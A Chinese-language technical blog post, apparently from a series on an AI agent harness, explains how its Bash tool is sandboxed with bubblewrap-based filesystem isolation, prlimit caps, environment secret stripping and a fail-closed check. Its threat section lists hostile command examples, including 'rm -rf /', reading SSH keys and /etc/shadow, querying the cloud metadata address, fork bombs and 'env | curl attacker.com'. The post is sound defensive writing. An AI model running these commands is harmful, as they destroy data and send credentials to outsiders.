---
title: "第 10 篇：Bash 沙箱 —— srt FAIL-CLOSED + prlimit + secret 永远剥离"
slug: 10-bash-sandbox
date: 2026-06-07
series: oxygenie-agent-harness
series_index: 10
keywords: [Bash 沙箱, srt, bubblewrap, prlimit, secret stripping, FAIL-CLOSED]
prev: 09-ask-act-hitl
next: 11-multi-tenant-isolation
---

# 第 10 篇：Bash 沙箱 —— srt FAIL-CLOSED + prlimit + secret 永远剥离

> 用户经 LLM 让你的服务器跑 `rm -rf /`、`curl 内网`、`cat ~/.ssh/id_rsa` 时谁拦？OxyGenie 的 Bash 是**自己包的**（第 06 篇），每条命令都过三道关：srt（bubblewrap）文件系统硬隔离、`prlimit` 资源硬上限、`buildSafeEnv()` 密钥剥离。而最关键的一条是：**沙箱没就位时，直接拒绝执行（FAIL-CLOSED），绝不裸跑。**

**章节跳转：**[问题](#问题陈述) · [朴素方案](#朴素方案为什么不行) · [核心方案](#核心方案硬边界--硬上限--永剥密钥--fail-closed) · [实现要点](#关键实现要点) · [反直觉结论](#反直觉结论) · [生产坑](#三个生产坑)

## 问题陈述

Bash 是 Agent 工具集里**能力最强、也最危险**的一个。它不是"调一个受控 API"，而是"在你的宿主机上跑一条任意 shell 命令"——而这条命令的最终来源是用户（经由 LLM）。它可能是无害的 `ls`，也可能是 `rm -rf /`、`cat /etc/shadow`、`curl http://169.254.169.254/`（云元数据接口）、或者一个 fork 炸弹。

要同时挡住四类威胁，缺一不可：

1. **越权读写**：碰系统目录（`/etc`、`/root`、`/proc`）、碰别的用户的会话目录。
2. **资源耗尽**：fork 炸弹把进程表撑爆、`tail /dev/zero` 把内存吃光、`dd` 把磁盘写满——这些都不是"恶意读取"，而是"合法操作的过量版本"，黑名单根本无从下手。
3. **密钥外带**：`env | curl attacker.com`、`cat $ANTHROPIC_AUTH_TOKEN`——把宿主机的密钥顺着网络带出去。
4. **沙箱本身没起来时还照跑**：这是最隐蔽也最致命的一类——前三道防线都写好了，但某次部署里 srt 没装上、Seatbelt profile 加载失败，系统"贴心地"降级成裸跑。等于所有防护一夜归零，还毫无察觉。

## 朴素方案为什么不行

**方案一：靠命令黑名单。** 维护一张"危险命令"正则表，匹配到 `rm -rf`、`curl`、`dd` 就拒绝。这条路从一开始就输了：`rm -rf /` 能写出一百种变体——`rm -fr`、`rm --recursive --force`、`$(echo rm) -rf`、用环境变量拼、用 base64 解码再 `eval`、换 `find . -delete`、换一个根本不叫 rm 的脚本……**你在枚举攻击，攻击者在枚举绕过，这场仗黑名单永远在追赶**。命令字符串的语义空间是无限的，靠正则去理解"这条命令会不会删掉重要东西"是不可能完成的任务。

**方案二：沙箱失败就降级裸跑。** "沙箱没起来？那就先不沙箱，让命令跑起来再说，别影响用户体验。"——这是最危险的一种"方便"。它把"安全"做成了"尽力而为"：平时有沙箱，某次环境异常就静默裸跑。等于在最该兜底的时刻撤掉了兜底。第 05 篇已经为整个项目立下 FAIL-CLOSED 规矩：**安全机制不就位时，正确的行为是拒绝，不是放行**。

两个方案的共同病根：**它们都在"理解命令意图"或"在便利和安全之间妥协"上做文章，而正确的方向是把命令放进一个它根本够不到危险目标的盒子里，再给这个盒子设硬上限，并且让盒子"宁可不开门，也不裸奔"。** 不要试图判断命令想干什么，而要让它即使想干也干不成。

## 核心方案：硬边界 + 硬上限 + 永剥密钥 + FAIL-CLOSED

OxyGenie 的 Bash 安全模型由四件事叠成，每件对应上面一类威胁：

> **srt 的文件系统围栏（够不到）＋ prlimit 的资源硬上限（耗不尽）＋ buildSafeEnv 的密钥剥离（带不走，且独立于沙箱永远生效）＋ FAIL-CLOSED（沙箱没起来就拒绝，绝不裸跑）。**

**1. FAIL-CLOSED —— 沙箱未就位就拒绝执行。** `runBash()` 在跑任何命令之前先 `ensureSandbox()`：只有在 srt active **或** runtime 是 docker 这两种"确实有硬隔离"的情况下才继续；两者皆无，直接抛错拒绝（`runner.js` L179–197）。没有"降级裸跑"这个分支——这是整套设计的地基，少了它，下面三道关的意义全失。

**2. srt 文件系统硬隔离 —— 让命令"够不到"。** srt（基于 bubblewrap）给命令套一个文件系统围栏：`denyRead=[/]` 先把整个根全部禁读，再 `allowRead=[workspace,/usr,…]` 白名单放行运行所需的少数目录，`allowWrite=[workspace,/tmp]` 只让写当前会话工作区和临时目录。在这个围栏里，`cat ~/.ssh/id_rsa` 不是"被规则拦下"，而是那个文件**根本不在可见的文件系统里**；`rm -rf /` 删的是围栏内那个空壳根，碰不到宿主机真正的 `/`。**这才是边界——不是判断命令想删什么，而是让它能看到、能碰到的东西本就只有自己那一小块。**

**3. prlimit 资源硬上限 —— 让命令"耗不尽"。** 资源耗尽类威胁（fork 炸弹、内存炸弹、写满磁盘）不是靠"超时"能解决的——一个 fork 炸弹在毫秒级就能撑爆进程表，等你超时计时器到点，机器早跪了。OxyGenie 在 Linux 上用 `prlimit` 给命令设**内核级硬上限**：`RLIMIT_AS` 2GB（地址空间）、`RLIMIT_NPROC` 512（进程数，直接掐死 fork 炸弹）、`RLIMIT_FSIZE` 2GB（单文件大小）。再叠一层执行层的帽子：超时 300s、输出帽 512KB、磁盘 2GB 软配额（超额告警）。**超时是兜底，prlimit 才是边界**——内核在你的进程试图越界的那一刻就拒绝它，而不是事后清理。

**4. 密钥永远剥离 —— 独立于沙箱，永远生效。** `buildSafeEnv()` 不管沙箱开没开、是 srt 还是 docker、甚至沙箱整个失效，都把传给子进程的环境变量收缩到一个白名单（PATH/HOME/LANG/TZ/PYTHON* 等运行必需项）。`ANTHROPIC_API_KEY`、`ANTHROPIC_AUTH_TOKEN` 这些**从源头就不进子进程的 env**。这一层故意做成**与沙箱解耦**的：哪怕 srt 因为某种原因没拦住、命令真的拿到了一个能联网的环境，它 `env` 出来也看不到任何密钥——没有可外带的东西。

## 关键实现要点

| 文件 | 行号 | 机制 |
|------|------|------|
| `src/claude/bash/runner.js` | L179–197 | FAIL-CLOSED：沙箱未就位则拒绝 |
| `src/claude/bash/runner.js` | L120–127 | prlimit：2GB 内存 / 512 进程 / 2GB 文件 |
| `src/claude/bash/runner.js` | L135–145, L219–227 | 磁盘前后测量 + 超额告警 |
| `src/claude/execution/sandbox.js` | L43–49 | `buildSafeEnv()` env 白名单剥离 |
| `src/claude/execution/sandbox.js` | L86–115 | `ensureSandbox()`：denyRead=[/] / allowWrite=[workspace,/tmp] |

数字一览：超时 **300s**、输出 **512KB**、磁盘 **2GB**、内存/进程/文件 prlimit **2GB / 512 / 2GB**。

FAIL-CLOSED 那一段的逻辑是整个模型的开关：

```javascript
// runner.js ~L179
const { srtActive, runtime } = await ensureSandbox(workspace)
if (!srtActive && runtime !== 'docker') {
  throw new Error('sandbox not ready — refusing to run')   // 没有"降级裸跑"分支
}
// 到这里才有资格跑：env 已被 buildSafeEnv 剥光密钥，命令将在 srt 围栏 + prlimit 下执行
```

注意三层在代码里的先后：先 FAIL-CLOSED 决定"能不能跑"，再由 srt 决定"能碰到什么"，prlimit 决定"能耗多少"，而 `buildSafeEnv()` 的剥离发生在最外面、与这一切无关——它在每条命令上都生效，沙箱开关拨到哪都拦不住它。

## 反直觉结论

> [!IMPORTANT]
> **命令校验是辅助，沙箱才是边界；而密钥剥离独立于沙箱、永远生效。**
>
> 三句话记住 OxyGenie 的 Bash 安全模型：① 别指望黑名单拦住 `rm -rf`——靠 srt 的 FS 围栏让它**够不到**该删的东西；② 资源耗尽靠 `prlimit` 的**硬上限**而非超时；③ 哪怕 srt 整个失效，`buildSafeEnv()` 仍保证子进程拿不到密钥。把它收成一句压舱石：**沙箱可以失败到"拒绝执行"，但绝不会失败到"裸跑且带着密钥"。** 这两个失败方向的差距，就是一个能交付的安全模型和一个事故现场的差距——前者宁可少跑一条命令，后者会在你最意想不到的那天把密钥送出去。

## 三个生产坑

> [!WARNING]
> **坑一 —— 命令校验是启发式纵深，不是白名单，别把它当主防线。**
> runner 里确实有一段命令字符串校验（catch `..` 越界、绝对路径越界这类明显信号），但它的定位是**纵深防御的辅助**，不是安全的主体。真正兜住越权读写的是 srt 的 FS 围栏——命令校验只是在围栏之前多挡一道、并给出更清楚的拒绝理由。千万别因为"这里有命令校验"就以为可以放松沙箱：校验能被绕过（命令变体无穷），围栏不能（够不到就是够不到）。把心智模型摆正——校验是篱笆上的一道补漏，srt 才是墙。

> [!WARNING]
> **坑二 —— srt 的 Seatbelt profile 在 macOS 上会挡正常 Python 路径，Mac 开发请用 docker。**
> srt 在 macOS 走的是 Seatbelt（sandbox-exec）那套 profile，它会拦掉一些 Python 解释器正常需要的路径，导致本该跑通的命令报莫名其妙的权限错。这不是 bug，是 macOS 沙箱模型和 Linux bubblewrap 的差异。**Mac 上开发请显式设 `EXEC_RUNTIME=docker`**，用 docker 这条 runtime 来满足 FAIL-CLOSED 的"有硬隔离"条件，别在 Mac 上指望 srt 跑顺。生产是 Linux，srt 才是主路径——把开发环境和生产环境的沙箱后端分清楚，能省掉一整天的"为什么我本地跑不起来"。

> [!WARNING]
> **坑三 —— prlimit 仅 Linux 生效，非 Linux 上资源上限是 best-effort。**
> `prlimit` 那段有 `platform==='linux'` 的判断——它本来就是 Linux 的内核机制。在非 Linux 平台上，那几条 `RLIMIT_*` 硬上限不会施加，资源限制退化成"尽力而为"（靠超时、输出帽这类软手段）。这意味着**非 Linux 上的硬边界只能靠 srt 或 Docker，资源维度的硬隔离是缺失的**。所以生产部署务必落在 Linux 上，让 prlimit 真正生效；如果出于某种原因要在别的平台跑，要清楚地知道"内核级资源上限这一层此刻是空的"，fork 炸弹/内存炸弹的硬防护只剩容器层那一道。

三个坑的共同根源：**沙箱的强度高度依赖它脚下的操作系统**。命令校验在哪都能跑但哪都不够硬，srt 的行为随 macOS/Linux 而变，prlimit 干脆只认 Linux。这就是为什么 OxyGenie 把生产钉死在 Linux、把"沙箱后端是什么"做成显式配置（`EXEC_RUNTIME`）——安全模型不能假设"沙箱总是那个沙箱"，它必须知道自己此刻站在哪种地基上，并在地基不达标时果断 FAIL-CLOSED。

## 配图

1. ![Bash 三道关：srt FS 围栏 / prlimit / secret strip](../assets/img/10-bash-three-gates.svg)
2. ![FAIL-CLOSED：ensureSandbox 决策](../assets/img/10-fail-closed.svg)

## 下一篇

→ [第 11 篇：多租户隔离](./11-multi-tenant-isolation.md)

沙箱挡住了"够不到系统目录"，但多租户还有一道题没答：用户 A 怎么就读不到用户 B 的会话目录？下一篇讲两层叠加的隔离——文件系统上每会话一个独立 workspace，逻辑上每个文件工具调用前过跨租户校验，以及一个看似多余实则关键的设计：为什么"逻辑层校验"要排在"沙箱围栏"之前。

---

📌 [reading-map.md](../reading-map.md)
